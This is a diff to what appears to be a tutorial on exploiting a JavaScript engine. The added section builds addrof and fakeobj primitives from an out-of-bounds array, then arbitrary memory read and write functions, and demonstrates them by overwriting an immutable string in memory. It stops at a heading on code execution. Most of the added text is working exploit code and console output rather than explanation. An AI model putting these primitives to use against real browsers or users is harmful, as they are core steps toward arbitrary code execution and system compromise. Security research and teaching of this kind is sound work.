@@ -908,7 +908,7 @@ Once everything's set up we do the xor exploit thing and end up with the fake ar
 <div class="jsMem">
 	<div class="jsMemTitle">VARS<div class="jsMemSep"></div></div>
 	<div class="jsMemDbg"><span class="jsMemVar2">arr</span> = [5.43231e-312, <span class="jsMemVar0">3.88113e-311</span>, <span class="jsMemVar1">5.43231e-312</span>] // <span class="jsMemVar13">0x000432f9</span>
-<span class="jsMemVar3">tmpObj</span> = {<span class="jsMemVar15">a</span>: <span class="jsMemVar16">1</span>} // <span class="jsMemVar11">0x00043309</span>
+<span class="jsMemVar3">tmpObj</span> = {<span class="jsMemVar5">a</span>: <span class="jsMemVar4">1</span>} // <span class="jsMemVar11">0x00043309</span>
 <span class="jsMemVar9">objArr</span> = <span class="jsMemVar10">[<span class="jsMemVar11">tmpObj</span>]</span> // <span class="jsMemVar14">0x00043341</span>
 <span class="jsMemVar0">oob</span> = [...] // <span class="jsMemVar12">0x000432e9</span></div>
 <div class="jsMemTitle">OUT<div class="jsMemSep"></div></div>
@@ -918,20 +918,104 @@ Once everything's set up we do the xor exploit thing and end up with the fake ar
 <span class="jsMemVar13">0x000432f8</span>: 0x<span class="jsMemVar2">00000725001cb7c5</span>
 0x00043300: 0x<span class="jsMemVar2">00000006000432d9</span>
 <span class="jsMemVar11">0x00043308</span>: 0x<span class="jsMemVar3">00000725001d3b05</span>
-0x00043310: 0x<span class="jsMemVar16">00000002</span>00000725
+0x00043310: 0x<span class="jsMemVar4">00000002</span>00000725
 0x00043318: 0x0001000100000685
 0x00043320: 0x0000074d00000000
-0x00043328: 0x00000084<span class="jsMemVar15">00002af1</span>
+0x00043328: 0x00000084<span class="jsMemVar5">00002af1</span>
 0x00043330: 0x<span class="jsMemVar10">0000056d</span>00000002
 0x00043338: 0x<span class="jsMemVar11">00043309</span><span class="jsMemVar10">00000002</span>
 <span class="jsMemVar14">0x00043340</span>: 0x<span class="jsMemVar9">00000725001cb845</span>
 0x00043348: 0x<span class="jsMemVar9">0000000200043335</span>
-...</div>
-<div class="jsMemTitle">ENG<div class="jsMemSep"></div></div>
-<div class="jsMemLegend">
-</div>
-</div>
+...</div></div>
 
+Neat! If we stare at the patterns in the memory we can make out the other arrays and stuff we initialized earlier. And if you think about it, we pretty much already have the **addrof** and **fakeobj** primitives here. We can get the address of the object in **objArr**, so if we put any object of our choice in that array we can see its address. And similarly, if we put an address to an object at that spot, we'll be able to access it through that array.
+
+Let's write the primitives to get and set the upper 32 bits:
+
+```js
+function addrof(o) {
+  objArr[0] = o;
+  return f2i(oob[10]) >> 32n;
+}
+
+function fakeobj(a) {
+  const temp = f2i(oob[10]) & 0xFFFFFFFFn;
+  oob[10] = i2f(temp + (a << 32n));
+  return objArr[0];
+}
+```
+
+If the address was at the lower bits, we'd need to modify the code a bit:
+
+
+```js
+function addrof(o) {
+  objArr[0] = o;
+  return f2i(oob[10]) & 0xFFFFFFFFn;
+}
+
+function fakeobj(a) {
+  const temp = f2i(oob[10]) & 0xFFFFFFFF00000000n;
+  oob[10] = i2f(temp + a);
+  return objArr[0];
+}
+```
+
+Time to try them out! Let's do an experiment where we first try to get the address of our fake array, and then turn that address into a pointer to our array.
+
+```js
+...
+> hex32(addrof(oob))
+< 0x000432e9
+> fakeArray = fakeobj(0x000432e9n)
+> fakeArray
+< (128) [3.88113e-311, 5.43231e-312, 3.88113e-311, 1.27321e-313, ...]
+```
+
+Sweet! The pointer addresses here are tagged, so they're 1 bigger than the actual memory locations. We could make addrof and fakeobj subtract and add 1 to see and use the actual memory addresses, but it's a matter of taste.
+
+Lastly we'll want to create primitives to arbitrarily **read** and **write** memory. To do that, we can create a new array, point it at any memory location we desire, and then read or write its first element. Although we did set the length of an array in two separate memory locations earlier, it turns out this isn't always required depending on what we want to do. If we just want to read or write a single double, we can just specify the desired address in the array header and it'll do the trick.
+
+```js
+function read(addr) {
+  const readArr = [1.1, 2.2];
+  readArr[0] = i2f(0x00000725001cb7c5n);
+  readArr[1] = i2f(0x0000000200000000n + addr - 0x8n);
+  return f2i(fakeobj(addrof(readArr) - 0x10n)[0]);
+}
+
+function write(addr, data) {
+  const writeArr = [1.1, 2.2];
+  writeArr[0] = i2f(0x00000725001cb7c5n);
+  writeArr[1] = i2f(0x0000000200000000n + addr - 0x8n);
+  const fakeArr = fakeobj(addrof(writeArr) - 0x10n);
+  fakeArr[0] = i2f(data);
+}
+```
+
+Did you know that strings in JavaScript are immutable! Anyways let's mutate them using the cool new functions we cooked up.
+
+```js
+> text = "ponypony"
+> text
+< 'ponypony'
+> textAddr = addrof(text)
+> hex32(textAddr)
+< 0x001d35fd
+> hex64(read(textAddr))
+< 0x430b3ed2000003dd
+> hex64(read(textAddr + 0x8n))
+< 0x796e6f7000000008
+> hex64(read(textAddr + 0xcn))
+< 0x796e6f70796e6f70
+> write(textAddr + 0xcn, 0x6172796C6172796Cn) // arylaryl
+> text
+< 'lyralyra'
+```
+
+We've done the impossible! Imagine how much we're gonna be able to speed up the performance of our webapps by running this exploit and making strings mutable.
+
+## Part 4: Code execution
 
 <!--
 DebugPrint: 0x25ec00042be9: [JSArray]
